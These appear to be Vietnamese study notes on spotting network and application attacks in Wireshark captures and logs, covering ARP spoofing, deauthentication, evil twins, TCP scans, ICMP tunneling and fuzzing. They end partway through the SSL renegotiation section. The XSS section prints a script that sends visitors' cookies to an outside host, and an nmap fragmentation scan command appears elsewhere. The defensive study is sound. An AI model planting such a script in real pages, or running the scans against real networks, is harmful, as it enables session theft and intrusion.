
![[Pasted image 20240823162149.png]]



# 1. Link Layer Attacks

## ARP Spoofing & Abnormality Detection

#### ARP Spoofing
Address Resolution Protocol (ARP): thường bị lợi dụng để Man-in-the-middle  và denial-of-service attacks 

Key để tìm ARP Spoofing:
Wireshark:
```
arp.opcode

opcode == 1: all ARP request
opcode == 2: all ARP replies
```

![[Pasted image 20240820135441.png]]

Để sàn lọc nhiều hơn
```
arp.duplicate-address-detected && arp.opcode == 2
```

Tuy nhiên ta cần xác định được IP gốc -> Tìm ra thiết bị thay đổi ip thông qua Mac spoofing

```
(arp.opcode) && ((eth.src == 08:00:27:53:0c:ba) || (eth.dst == 08:00:27:53:0c:ba))
```

![[Pasted image 20240820142634.png]]

Trong trường hợp này, chúng ta có thể ngay lập tức nhận thấy rằng địa chỉ MAC 08:00:27:53:0c

ban đầu được liên kết với địa chỉ IP 192.168.10.5, nhưng gần đây đã chuyển sang 192.168.10.4 -> ARP spoofing hoặc làm nhiễu cache.

#### ARP Scanning 

1 vài cách nhận dạng ARP Scanning

1. `Broadcast ARP requests sent to sequential IP addresses (.1,.2,.3,...)`
    
2. `Broadcast ARP requests sent to non-existent hosts`
    
3. `Potentially, an unusual volume of ARP traffic originating from a malicious or compromised host`

#### Findding ARP scanning
```
arp.opcode
```

![[Pasted image 20240823093702.png]]

=>Các hosts đang  phản hồi các yêu cầu ARP của chúng -> Attacker đã thực hiện thành công việc thu nhập thông tin 

#### Identifying Denial-of-Service
![[Pasted image 20240823094059.png]]
=> Ngay lập tức, chúng tôi có thể lưu ý rằng lưu lượng ARP của kẻ tấn công có thể chuyển trọng tâm sang việc khai báo địa chỉ MAC mới cho all live IP addresses. Mục đích ở đây là làm hỏng ARP cache của bộ định tuyến
![[Pasted image 20240823094239.png]]

-> Ngược lại, chúng ta có thể chứng kiến ​​việc phân bổ trùng lặp 192.168.10.1 cho các thiết bị khách. Điều này cho thấy kẻ tấn công đang cố gắng làm hỏng ARP cachecủa các thiết bị nạn nhân này với mục đích cản trở lưu lượng truy cập theo cả hai hướng


## 802.11 Denial of Service

#### How Deauthentication Attacks Work

Thường thực hiện ở **link-layer**, attacker thường dùng để:
+ Thu nhập WPA handshake -> offline dictionary attack
+ Dos
+ Để buộc người dùng ngắt kết nối khỏi mạng của chúng ta và có thể kết nối với mạng của kẻ tấn công nhằm thu thập thông tin
-> Attacker sẽ giả mạo một khung Deauthentication 802.11 trông như xuất phát từ điểm truy cập legit -> sau đó ngắt kết nối mạng thiết bị ra khỏi mạng -> thường thì thiết bị sẽ kết nối lại và thực hiện quy trình handshake trong khi attacker đang sniffing 
![[Pasted image 20240823100744.png]]Attacker giả mạo hoặc thay đổi địa chỉ MAC của frame'sender. client không thể thực sự phân biệt được sự khác nhau nếu không có các biện pháp kiểm soát bổ sung như IEEE 802.11w (Management Frame Protection). Mỗi yêu cầu deauthentication đều đi kèm với một mã lý do (reason code) để giải thích lý do tại sao thiết bị khách bị ngắt kết nối.

Trong hầu hết các trường hợp, các công cụ cơ bản như **aireplay-ng và mdk4** sử dụng mã lý do **7** để thực hiện deauthentication.

REASON CODE: https://support.zyxel.eu/hc/en-us/articles/360009469759-What-is-the-meaning-of-802-11-Deauthentication-Reason-Codes

#### Finding Deauthentication Attacks

Cheatsheet: https://semfionetworks.com/wp-content/uploads/2021/04/wireshark_802.11_filters_-_reference_sheet.pdf


limit i lưu lượng truy cập từ BSSID (MAC) của AP in wireshark:
```
 wlan.bssid == xx:xx:xx:xx:xx:xx
```

Giả sử chúng ta muốn xem xét các khung hủy xác thực từ BSSID của chúng ta hoặc kẻ tấn công giả vờ gửi những khung này từ BSSID của chúng ta, chúng ta có thể sử dụng bộ lọc Wireshark sau:
```
(wlan.bssid == xx:xx:xx:xx:xx:xx) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12)
```

![[Pasted image 20240823101626.png]]

![[Pasted image 20240823101632.png]]

 Nhiều khung hủy xác thực đã được gửi đến một trong các thiết bị  client -> dấu hiệu của cuộc tấn công. Ngoài ra, nếu i mở các tham số cố định trong quản lý không dây,  ta thấy reason code = 7 (aireplay-ng,mkd4)
 ![[Pasted image 20240823101758.png]]


```
(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 7)
```

![[Pasted image 20240823101831.png]]
#### Revolving Reason Codes
Tuy nhiên  tinh vi hơn có thể cố gắng né tránh dấu hiệu rõ ràng này bằng cách thay đổi liên tục reason code. Attacker có thể cố gắng tránh bất kỳ cảnh báo nào có thể được kích hoạt bởi hệ thống phát hiện xâm nhập không dây (wireless intrusion detection system) bằng cách thay đổi reason code sau một thời gian nhất định.

-> Mẹo để phát hiện kỹ thuật này là tăng dần reason code như cách mà một script của kẻ tấn công sẽ làm. Chúng ta sẽ bắt đầu với mã lý do 1.

```
(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 1)
```


```
(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 2)
```
.....

-> Khó giải quyết lắm nên phải có biện pháp:

1. `Enable IEEE 802.11w (Management Frame Protection) if possible`
2. `Utilize WPA3-SAE`
3. `Modify our WIDS/WIPS detection rules`


#### Finding Failed Authentication Attempts

Giả sử attacker cố gắng kết nối với mạng không dây  -> có thể nhận thấy có quá nhiều yêu cầu liên kết đến từ một thiết bị. Để lọc những thứ này, chúng ta có thể sử dụng như sau.

```
(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 0) or (wlan.fc.type_subtype == 1) or (wlan.fc.type_subtype == 11)
```


## Rogue Access Point & Evil-Twin Attacks

Đối với các access points độc hại, rogue và evil-twin attacks -> nổi nhất
![[Pasted image 20240823154653.png]]
#### Rogue Access Points
Rogue Access Points là mạng WIFI giả mạo (clone) có các thông số giống hệt một WIFI mục tiêu. Rogue Access Points do Hacker tạo ra để lừa người dùng kết nối vào, sau đó thực hiện đánh cắp mật khẩu hoặc các thông tin cá nhân khác

-> Khi 2 mạng có cùng SSID, thiết bị sẽ ưu tiên mạng nào có tín hiện mạnh nhất và nhìn thấy đầu tiên -> Hacker có thể giả dạng một điểm truy cập có cùng SSID mặc định -> có thể dùng tool như airmon-ng để tìm ssid 
#### Evil Twin

![[Pasted image 20240823160003.png]]


#### Airodump-ng Detection

```
(wlan.fc.type == 00) and (wlan.fc.type_subtype == 8)
```
wlan.fc.type_subtype == 8 : lọc beacon và phân tích phần Robust Security Network (RSN)
Thông thường một AP legit sẽ có phần RSN đầy đủ các AES, TKIP, PSK
![[Pasted image 20240823161807.png]]

Còn với AP not Legit thì sẽ ko có
![[Pasted image 20240823161820.png]]


Sau khi xác định được AP nào là mối đe dọa -> cần xác định xem User nào đã bị 'nhập' :))) 

```
(wlan.bssid == F8:14:FE:4D:E6:F2)
```
![[Pasted image 20240823161929.png]]

Nếu chúng ta phát hiện các ARP requests phát sinh từ một client device kết nối với mạng nghi ngờ, chúng ta có thể xác định đây là một chỉ báo tiềm năng của việc bị xâm phạm. Trong các trường hợp như vậy, chúng ta nên ghi lại các thông tin liên quan về client device để tiến hành các nỗ lực phản ứng sự cố tiếp theo.![[Pasted image 20240823162026.png]]


# 2. Detecting Network Abnormalities

## Fragmentation Attacks

https://www.trueneutral.eu/2015/wireshark-frags-1.html

Phân mảnh là phương pháp để các host chính thống giao tiếp các tập dữ liệu lớn với nhau bằng cách chia nhỏ các gói tin và ghép lại chúng khi đến đích. 
Điều này thường được thực hiện thông qua việc thiết lập maximum transmission unit (MTU). MTU được sử dụng như tiêu chuẩn để chia các gói tin lớn thành các kích thước bằng nhau để phù hợp với toàn bộ việc truyền tải. Cần lưu ý rằng gói tin cuối cùng sẽ có kích thước nhỏ hơn. Trường này cung cấp hướng dẫn cho host đích về cách ghép lại các gói tin này theo thứ tự hợp lý.

![[Pasted image 20240823165208.png]]

- **Disrupt reassembly** – Gửi các fragments bị biến dạng gây ra lỗi hoặc sự cố trong quá trình tái tạo, dẫn đến denial-of-service.
- **Bypass firewalls** – Né tránh các quy tắc firewall bằng cách gửi các cuộc tấn công trong các gói tin phân mảnh mà không bị kiểm tra.
- **Target wireless networks** – Phân mảnh làm gia tăng rủi ro bảo mật trong các mạng không dây bằng cách làm gián đoạn các cơ chế toàn vẹn và lộ dữ liệu.
- **Overload resources** – Khối lượng lớn các fragments có thể làm quá tải khả năng mạng và tài nguyên máy chủ.
- **Takedown websites** – Các cuộc tấn công phân mảnh làm cho các web servers không khả dụng bằng cách tiêu tốn tài nguyên quá mức hoặc gây ra sự cố.
- **Evade detection** – Malware và exploits bị che giấu bằng cách chia nhỏ qua các fragment offsets ngẫu nhiên để tránh phát hiện theo chữ ký.
- **Achieve denial-of-service (DoS)** – Hầu hết các cuộc tấn công phân mảnh nhằm mục đích làm gián đoạn khả năng của mạng, hệ thống và dịch vụ thông qua các vectơ tấn công khác nhau.

ví dụ
```shell-session
nmap -f 10 <host ip>
```
làm như vậy chúng sẽ tạo ra các gói IP có kích thước tối đa là 10. Việc thấy rất nhiều phân mảnh từ máy chủ có thể là dấu hiệu của cuộc tấn công này và nó sẽ giống như sau
![[Pasted image 20240823165050.png]]




## IP Source & Destination Spoofing Attacks


Trong phân tích lưu lượng mạng, việc xem xét các trường IP nguồn và IP đích là rất quan trọng để phát hiện các hành vi bất thường.

### Các Điểm Quan Trọng Khi Phân Tích Trường IP


1. **Địa chỉ IP nguồn nên luôn đến từ subnet của mình***: Nếu  một gói tin đến từ một địa chỉ IP bên ngoài mạng nội bộ -> dấu hiệu tạo gói tin thủ công, hay còn gọi là packet crafting.
2. **Địa chỉ IP nguồn cho lưu lượng ra, luôn đến từ subnet của mình***: Nếu địa chỉ IP nguồn từ một dải IP khác với mạng cục bộ, điều này có thể là dấu hiệu của lưu lượng độc hại phát sinh từ bên trong mạng

### Các Loại Tấn Công Có Thể Xảy Ra

1. Quét Decoy (Decoy Scanning
    
    - **Mục đích**: Để vượt qua các hạn chế của firewall,**attacker**  có thể thay đổi IP nguồn của gói tin để thu thập thêm thông tin về một máy chủ ở phân đoạn mạng khác.
    - **Cách thực hiện**: Bằng cách thay đổi IP nguồn thành một IP trong cùng subnet với máy chủ mục tiêu, **attacker**  có thể tránh được sự phát hiện của firewall.
2.  Random Source Attack DDoS
    - **Mục đích**: Gửi một lượng lớn lưu lượng đến cùng một cổng trên máy chủ mục tiêu để làm cạn kiệt tài nguyên của các cơ chế bảo vệ mạng hoặc máy chủ đích.
    - **Cách thực hiện**: Kẻ tấn công sử dụng IP nguồn ngẫu nhiên để gửi một lượng lớn gói tin đến một cổng cụ thể.
3. LAND Attacks
    - **Mục đích**: Làm cạn kiệt tài nguyên mạng hoặc gây ra sự cố trên máy chủ mục tiêu.
    - **Cách thực hiện**: Đặt địa chỉ IP nguồn giống như địa chỉ IP đích, khiến máy chủ mục tiêu nhận gói tin từ chính nó và gây ra các vấn đề về tài nguyên.
    
4. SMURF Attacks
    - **Mục đích**: Gây cạn kiệt tài nguyên của địa chỉ IP nguồn (máy chủ mục tiêu).
    - **Cách thực hiện**: Gửi một lượng lớn gói tin ICMP đến nhiều máy chủ khác nhau với địa chỉ IP nguồn là của máy chủ mục tiêu. Các máy chủ nhận gói tin sẽ phản hồi với các gói tin ICMP, gây cạn kiệt tài nguyên của địa chỉ IP nguồn.

5. Tạo Initialization Vector (IV) (Initialization Vector Generation)
    
    - **Mục đích**: Xây dựng bảng giải mã cho các cuộc tấn công thống kê trong các mạng không dây cũ như WEP (Wired Equivalent Privacy).
    - **Cách thực hiện**: Kẻ tấn công có thể thu thập, giải mã, tạo và tái chèn các gói tin với địa chỉ IP nguồn và đích đã được thay đổi để tạo ra các vector khởi tạo.

=> Thường kết hợp với các kiểu tấn công khác

#### Finding Decoy Scanning Attempts

Có thể nhận biết:
+ Phân mảnh ban đầu từ một địa chỉ giả
+ Một số lưu lượng TCP từ địa chỉ nguồn hợp pháp
![[Pasted image 20240823172307.png]]Thứ hai, trong cuộc tấn công này, kẻ tấn công có thể đang cố gắng che giấu địa chỉ của họ bằng mồi nhử, nhưng phản hồi cho nhiều cổng đã đóng sẽ vẫn hướng tới chúng bằng cờ RST được biểu thị cho TCP.

-> **Phản hồi với cờ TCP RST**: Mặc dù các cổng đóng sẽ gửi phản hồi với cờ TCP RST, nhưng các phản hồi này cũng đến các địa chỉ IP giả và địa chỉ IP thực của kẻ tấn công.
![[Pasted image 20240823172457.png]]
![[Pasted image 20240823172505.png]]
-> Attacker phải tiết lộ địa chỉ nguồn thực sự của chúng để biết rằng một cổng đang mở -> kì lạ nên có thể xác định được cuộc taasn công

#### Finding Random Source Attacks

-> cuộc tấn công từ chối dịch vụ thông qua việc giả mạo địa chỉ nguồn và đích. Một trong những ví dụ chính và nổi bật là  Finding Random Source Attacks

Nhiều máy chủ sẽ gửi ping đến một máy chủ không tồn tại, và máy chủ bị ping sẽ trả ping lại tất cả các máy chủ khác mà không nhận được phản hồi
![[Pasted image 20240823173154.png]]
Attacker có thể sử dụng phân mảng để làm cạn kiệ tài nguyên
![[Pasted image 20240823173228.png]]

Còn với LAND ATTACK
Thay vì giả mạo địa chỉ nguồn giống với địa chỉ đích, kẻ tấn công có thể chọn ngẫu nhiên chúng
![[Pasted image 20240823173258.png]]

=> Một vài dấu hiệu dễ nhận biết
1. Single Port Utilization from random hosts: chỉ sử dụng một cổng duy nhất để thực hiện các cuộc tấn công hoặc quét từ nhiều địa chỉ IP khác nhau, Các địa chỉ IP xuất phát từ nhiều nguồn khác nhau, có thể là ngẫu nhiên hoặc được giả mạo.
2. Incremental Base Port with a lack of randomization:g sử dụng một cổng cơ sở mà tăng dần theo một chuỗi nhất định, ví dụ, từ cổng 1000 lên cổng 1001, 1002, v.v. -> Không có sự ngẫu nhiên trong việc chọn cổng, có nghĩa là cổng được chọn theo một trật tự dự đoán đượ
3. Identical Length Fields: các trường trong các gói tin hoặc gói dữ liệu có cùng một độ dài. Ví dụ, nhiều gói tin có cùng kích thước payload hoặc cùng số lượng byte trong các trường nhất định.

#### Finding Smurf Attacks
https://techofide.com/blogs/what-is-smurf-attack-what-is-the-denial-of-service-attack-practical-ddos-attack-step-by-step-guide/

![[Pasted image 20240823173738.png]]
->
![[Pasted image 20240823173751.png]]

 một loại tấn công DDoS khai thác các Internet Protocol (IP) broadcast addresses Protocol (IP) để phát đi một số lượng lớn các yêu cầu đến địa chỉ IP mục tiêu từ nhiều nguồn khác nhau. Attacker gửi một số lượng lớn các yêu cầu Internet Control Message Protocol (ICMP) echo (ping) đến broadcast address của một mạng, làm cho các yêu cầu này có vẻ như đến từ địa chỉ IP của mục tiêu. Các yêu cầu sau đó được truyền đến mọi thiết bị trong mạng, tạo ra một lượng lớn lưu lượng có thể làm quá tải tài nguyên của mục tiêu và khiến nó bị sập.
 ![[Pasted image 20240823173950.png]]
 nhiều máy chủ khác nhau đang ping máy chủ duy nhất và trong trường hợp này, nó thể hiện bản chất cơ bản của các cuộc tấn công SMURF
![[Pasted image 20240823173959.png]]


## IP Time-to-Live Attacks

Về cơ bản, Attacker sẽ cố tình đặt TTL rất thấp trên các gói IP -> trốn tránh tường lửa, IDS và hệ thống IPS.
![[Pasted image 20240829181252.png]]
1. Tạo các IP packet với giá trị TTL thấp (1,2,3..)
2. Qua mỗi host mà nó đi qua, TTL sẽ giảm 1 đơn vị cho tới khi nó = 0
3. Khi =0, thì packet sẽ mất, Attacker sẽ cố làm nó biến mất khi nó sắp tới firewall hay filltering system
4. Khi các gói hết hạn, router sẽ tạo ra các thông báo ICMP Time Exceeded và gửi chúng lại source IP 

#### Finding Irregularities in IP TTL
Hầu hết attacker sử dụng ttl cho port scanning:
![[Pasted image 20240829181631.png]]
Và khi có SYN,ACK trả về cho attacker từ một service của ta -> Attacker thành công trốn được firewall
![[Pasted image 20240829181854.png]]

-> Cách phát hiện rất đơn giản "**TTL value rất thấp trong số các gói tin này** "
![[Pasted image 20240829181929.png]]
Do đó cần thêm bộ lọc TTL giá trị thấp


## TCP Handshake Abnormalities

Đầu tiên, đâu là hành vi bình thường
![[Pasted image 20240829182032.png]]
https://github.com/Merisreal/Digital-Forensics-and-Incident-Response/blob/main/Note%20Analyst%20Tools%20/Wireshark%20Note/%20Traffic%20Analysis/Nmap%20Scans.md

![[Pasted image 20240829182224.png]]

TCP FLAG:
- **URG (Urgent):** Cờ này được dùng để đánh dấu tính khẩn cấp của dữ liệu hiện tại trong luồng.  
- **ACK (Acknowledgement):** Cờ này xác nhận việc đã nhận được dữ liệu.  
- **PSH (Push):** Cờ này chỉ dẫn TCP stack ngay lập tức chuyển dữ liệu nhận được lên tầng ứng dụng mà không qua bộ đệm.  
- **RST (Reset):** Cờ này được dùng để chấm dứt kết nối TCP \).  
- **SYN (Synchronize):** Cờ này được dùng để thiết lập kết nối ban đầu với TCP.  
- **FIN (Finish):** Cờ này được dùng để đánh dấu kết thúc của một kết nối TCP. Nó được sử dụng khi không cần gửi thêm dữ liệu nữa.  
- **ECN (Explicit Congestion Notification):** Cờ này được sử dụng để báo hiệu tắc nghẽn trong mạng, nhằm thông báo cho các máy chủ tránh việc truyền lại dữ liệu không cần thiết.

Do đó, khi chúng ta thực hiện phân tích lưu lượng mạng, có thể tìm kiếm các điều kiện bất thường sau:
- **Quá nhiều cờ của một loại hoặc nhiều loại**: Điều này có thể cho thấy rằng đang xảy ra việc quét trong mạng của chúng ta.
- **Sử dụng các cờ khác thường và khác biệt**: Đôi khi điều này có thể chỉ ra một cuộc tấn công TCP RST, hijacking, hoặc đơn giản là một dạng điều khiển né tránh để quét.
- **Một máy chủ kết nối tới nhiều cổng, hoặc một máy chủ kết nối tới nhiều máy chủ khác**: Điều này dễ dàng giúp chúng ta phát hiện việc quét như đã thực hiện trước đây bằng cách nhận biết nơi mà các kết nối này đang đi từ một máy chủ. Trong nhiều trường hợp, chúng ta thậm chí cần xem xét việc quét giả (decoy scans) và tấn công từ nguồn ngẫu nhiên (random source attacks).


### Các trạng thái của cổng NMAP
https://viblo.asia/p/nmap-port-scan-cac-phuong-phap-quet-cong-tu-co-ban-den-nang-cao-gDVK2PMwlLj

- **Open**: cho biết rằng cổng đang được mở và lắng nghe
- **Closed**: cho biết rằng cổng không lắng nghe, mặc dù cổng có thể truy cập được. Bằng cách truy cập, điều đó có nghĩa là nó có thể tiếp cận và không bị chặn bởi tường lửa và các chương trình khác.
- **Filtered**: Có nghĩa là nmap không thể xác định được cổng đang đóng hay mở vì không thể truy cập được. Điều này xảy ra thường là do tường lửa chặn các gói đến nên không xác định được.
- **Unfilterd**: Có nghĩa là nmap không thể xác định được cổng mở hay đóng mặc dù có thể truy cập được. Trạng thái này phát hiện khi sử dụng ACK scan -sA.
- **Open|Filtered**: Nmap không thể xác định được cổng mở hay bị lọc.
- **Closed|Filtered**: Nmap không thể xác định được cổng đóng hay bị lọc.
- 

### Qá nhìu SYN Flags

+ Ví dụ điển hình cho việc nmap scanning
+ Nếu PORT open -> ACK
+ Nếu PORT close -> RST
![[Pasted image 20240829182652.png]]
Có 2 loại quét chính:
+ `SYN Scans` - Trong các lần quét này, hành vi sẽ như chúng ta thấy, tuy nhiên kẻ tấn công sẽ kết thúc bắt tay trước bằng cờ RST.
+ `SYN Stealth Scans` - Trong trường hợp này, kẻ tấn công sẽ cố gắng tránh bị phát hiện bằng cách chỉ hoàn thành một phần quá trình bắt tay TCP

### No Flags

Attacker ko gửi flag -> NULL scan
Có 2 trường hợp:
+ Nếu cổng mở - Hệ thống sẽ không phản hồi gì cả vì không có cờ
+ Nếu cổng bị đóng - Hệ thống sẽ phản hồi bằng gói RST
-> Cách này gửi gói TCP với tất cả các cờ được tắt, nếu cổng mở hoặc bị tường lửa chặn, ta sẽ không thể nhận được phản hồi, tuy nhiên nếu cổng đóng, ta nhận được phản hồi RST/ACK. Vì vậy, nó không thể chỉ ra chắc chắn là các cổng này đang mở, vì có thể bị chặn bởi firewall.

![[Pasted image 20240829182823.png]]

### Qá nhìu ACKs

ACK Scan

Trong trường hợp quét ACK, các kết nối TCP sẽ hoạt động như sau.:
+ Nếu cổng mở - Máy bị ảnh hưởng sẽ không phản hồi hoặc sẽ phản hồi bằng gói RST
+ Nếu cổng bị đóng - Máy bị ảnh hưởng sẽ phản hồi bằng gói RST.
![[Pasted image 20240829183009.png]]


Sử dụng cách này cho ta xác định được quy tắc tường lửa nếu có tường lửa được thiết lập. Ví dụ, nếu gửi gói đến và tường lửa không chặn, ta nhận được gói với cờ ACK được bật, tuy nhiên, nếu tường lửa chặn 1 số cổng, ta có thể dựa vào đây để nhận biết
![[Pasted image 20240829183145.png]]
-> 
![[Pasted image 20240829183151.png]]

### Qá nhìu FINs

Nếu cổng mở - Không phản hồi. 
Nếu cổng bị đóng -  Phản hồi bằng gói RST.
![[Pasted image 20240829183254.png]]

Cách này gửi gói TCP với cờ FIN được đặt, sẽ không nhận được phản hồi nào nếu cổng đang mở hoặc do tường lửa chặn. Tuy nhiên nếu cổng đóng, ta nhận được phản hồi RST/ACK từ đó có thể suy ra được cổng đang mở hay bị chặn

## Qá Nhiều flags  (XMAS SCAN)

Nếu cổng mở - Không phản hồi or RST
Nếu cổng bị đóng -  Phản hồi bằng gói RST.
![[Pasted image 20240829183345.png]]
Cách này gửi các gói với cờ FIN, PSH, URG được đặt. Tương tự, ta nhận được các phản hồi nếu cổng mở đóng như 2 cách trên.


## TCP Connection Resets & Hijacking

TCP không cung cấp mức độ bảo vệ để ngăn chặn các máy chủ bị chấm dứt kết nối hoặc bị tấn công 
->  có thể nhận thấy rằng một kết nối bị chấm dứt bởi gói RST hoặc bị tấn công thông qua việc chiếm quyền điều khiển kết nối

### TCP Connection Termination

- **Attacker sẽ giả mạo địa chỉ nguồn để trùng với địa chỉ của máy bị ảnh hưởng.**
- **Attacker sẽ sửa đổi gói TCP để chứa cờ RST nhằm chấm dứt kết nối.**
- **Attacker sẽ xác định destination port trùng với một port đang được sử dụng bởi một trong các máy của chúng ta.**

![[Pasted image 20240829184009.png]]


Một cách để xác minh rằng đây thực sự là một TCP RST attack -> (MAC address) của thiết bị gửi các gói TCP RST này. Giả sử địa chỉ IP 192.168.10.4 đã được đăng ký với địa chỉ MAC aa:aa:aa:aa:aa
trong danh sách thiết bị mạng của chúng ta, nhưng chúng ta lại phát hiện một địa chỉ MAC hoàn toàn khác đang gửi các gói TCP RST, như sau:

![[Pasted image 20240829184127.png]]

-> TCP RST Attack. Tuy nhiên, cần lưu ý rằng attacker có thể giả mạo địa chỉ MAC của họ để né tránh sự phát hiện. Trong trường hợp này, chúng ta có thể nhận thấy (retransmissions) và các vấn đề khác như đã thấy trong phần ARP poisoning.

## TCP Connection Hijacking

https://medium.com/@R00tendo/tcp-connection-hijacking-deep-dive-9bbe03fce9a9
![[Pasted image 20240829184651.png]]
Ba gói tin đầu tiên hoàn tất quá trình bắt tay 3 bước (3-way handshake).

Client gửi dữ liệu đến server với các giá trị SEQ và ACK của gói ACK cuối cùng bị hoán đổi (do chính client gửi).

Server nhận được dữ liệu (6 byte), thay thế giá trị ACK bằng SEQ và ngược lại, sau đó cộng thêm chiều dài của payload (6) vào giá trị ACK mới và phản hồi.

Client gửi dữ liệu đến server với các giá trị SEQ và ACK của gói ACK cuối cùng nhưng bị hoán đổi (do server gửi).

Lặp lại logic trên cho các gói tin còn lại.


Do đó Attacker  dự đoán số thứ tự (sequence number) để tiêm các gói tin độc hại của họ vào đúng thứ tự. Trong quá trình tiêm này, họ sẽ giả mạo địa chỉ nguồn thành địa chỉ của máy bị ảnh hưởng. -> thường dùng automated script.

Kẻ tấn công sẽ cần chặn các gói ACK không cho tới được máy bị ảnh hưởng để tiếp tục chiếm quyền điều khiển. Họ thực hiện việc này bằng cách trì hoãn hoặc chặn các gói ACK. Do đó, cuộc tấn công này thường được thực hiện cùng với ARP poisoning, và chúng ta có thể nhận thấy điều này trong quá trình phân tích lưu lượng mạng.

![[Pasted image 20240829185059.png]]


## ICMP Tunneling

Đường hầm là một kỹ thuật được attacker sử dụng để lấy dữ liệu từ vị trí này sang vị trí khác. Có nhiều loại đường hầm khác nhau và mỗi loại khác nhau sử dụng một giao thức khác nhau. Thông thường, những kẻ tấn công có thể sử dụng proxy để vượt qua các biện pháp kiểm soát mạng 

## Basics of Tunneling

Loại phổ biến nhất thường là SSH tunneling, ngoài ra còn proxy-based, HTTP, HTTPS, DNS, hay vài loại khác ![[Pasted image 20240829185730.png]]
Trong trường hợp ICMP tunneling, attacker sẽ đính kèm dữ liệu mà họ muốn đưa ra bên ngoài hoặc tới một máy chủ khác vào trường dữ liệu (data field) trong một yêu cầu ICMP. Điều này được thực hiện với ý định che giấu dữ liệu này trong một loại giao thức phổ biến như ICMP, và hy vọng rằng nó sẽ bị lạc trong lưu lượng mạng 

## Finding ICMP Tunneling

+ Một packet ICMP  sẽ tầm 48 bytes
+![[Pasted image 20240829185923.png]]

+ Cho nên bất kì packet ICMP  nào > 48 bytes -> data đang truyền
![[Pasted image 20240829185929.png]]
![[Pasted image 20240829185932.png]]
Hay attacker có thể mã hóa 
![[Pasted image 20240829185943.png]]
## Preventing ICMP Tunneling
+ Kiểm tra các yêu cầu request và replies cho dữ liệu
+ Không làm được thì Block ICMP request



# 3. Application Layer Attacks

## HTTP/HTTPs Service Enumeration

1. Lưu lượng HTTP/HTTP quá mức từ một máy chủ
2. Tham khảo nhật ký truy cập của máy chủ web  về hành vi tương tự
-> thường thì Attacker sẽ làm fuzz server trước khi bắt đầu tấn công
### Finding Directory Fuzzing
![[Pasted image 20240829190431.png]]
Http request
![[Pasted image 20240829190447.png]]
-> Directory Fuzzing dễ bị phát hiện vì:
+ Máy chủ sẽ liên tục cố gắng truy cập các tệp không tồn tại trên máy chủ web (phản hồi 404).
+ Máy chủ sẽ gửi chúng liên tiếp một cách nhanh chóng.

```shell-session
merisreal$ cat access.log | awk '$1 == "192.168.10.5"'
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /randomfile1 HTTP/1.1" 404 435 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /frand2 HTTP/1.1" 404 435 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /.bash_history HTTP/1.1" 404 435 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"

```

### Finding Other Fuzzing Techniques

- `http.request and ((ip.src_host == <suspected IP>) or (ip.dst_host == <suspected IP>))`
- 

![[Pasted image 20240829191539.png]]
![[Pasted image 20240829191548.png]]

Giả sử chúng tôi nhận thấy rằng có rất nhiều yêu cầu được gửi liên tiếp, điều này cho thấy có fuzzing

Tuy nhiên attacker có thể làm các cách sau để né :
+ Sắp xếp xen kẽ những phản hồi này trong một khoảng thời gian dài hơn.
+ Gửi những phản hồi này từ nhiều máy chủ hoặc địa chỉ nguồn.


## Strange HTTP Headers

Trong các HTTP request -> Một vài header tệ kiểu:

1. `Weird Hosts (Host: )`
2. `Unusual HTTP Verbs`
3. `Changed User Agents`

### Finding Strange Host Headers

![[Pasted image 20240829191835.png]]

![[Pasted image 20240829192128.png]]
Các Header tệ có thể thấy như 127.0.0.1

![[Pasted image 20240829192146.png]]
admin

https://www.yeswehack.com/learn-bug-bounty/http-header-exploitation

### Analyzing Code 400s and Request Smuggling

Code 400 -> cho thấy một "yêu cầu xấu" từ phía client
![[Pasted image 20240829192547.png]]
Follow ->
![[Pasted image 20240829192609.png]]

cve: https://github.com/dhmosfunk/CVE-2023-25690-POC

Code 200 -> response success


## Cross-Site Scripting (XSS) & Code Injection Detection

![[Pasted image 20240829192850.png]]

![[Pasted image 20240829193510.png]]
->, giả sử có khu vực nhận xét của người dùng trên máy chủ web h. Chúng ta có thể nhận thấy một trong những comment trông giống như sau.
Code: javascript

```javascript
<script>
  window.addEventListener("load", function() {
    const url = "http://192.168.0.19:5555";
    const params = "cookie=" + encodeURIComponent(document.cookie);
    const request = new XMLHttpRequest();
    request.open("GET", url + "?" + params);
    request.send();
  });
</script>
```
một số trường hợp kẻ tấn công có thể cố gắng chèn mã vào các trường này như hai ví dụ sau.

![[Pasted image 20240829193901.png]]

#### Preventing XSS and Code Injection
+ xử lý thông tin đầu vào của người dùng 
+ không diễn giải thông tin đầu vào của người dùng dưới dạng mã.

## SSL Renegotiation Attacks



**SSL renegotiation** là một quy trình trong giao thức **SSL/TLS** nơi client và server đồng ý thiết lập một kết nối **SSL** mới sử dụng kết nối hiện tại mà không làm gián đoạn việc truyền tải dữ liệu đang diễn ra. Quy trình này tương tự như **SSL handshake** ban đầu khi bạn kết nối với một trang web bảo mật.

 ví dụ:

Đang duyệt một trang web thương mại điện tử để mua sắm. Khi bạn lần đầu tiên kết nối với trang web, trình duyệt của bạn và máy chủ sẽ thực hiện **SSL handshake** để thiết lập một kết nối bảo mật. Trong quá trình này, họ trao đổi các khóa mã hóa và xác minh danh tính của nhau, đảm bảo rằng dữ liệu của bạn vẫn riêng tư và an toàn.

Giả sử bạn đã ở trên trang web trong một thời gian dài, thêm các sản phẩm vào giỏ hàng và duyệt các trang khác nhau. Phiên **SSL** vẫn đang hoạt động, duy trì bảo mật cho các tương tác của bạn. Tuy nhiên, có thể sẽ đến một lúc nào đó trang web cần xác thực lại bạn, có thể là do phiên của bạn đã hết thời gian hoặc bạn đang cố truy cập một trang bảo mật.

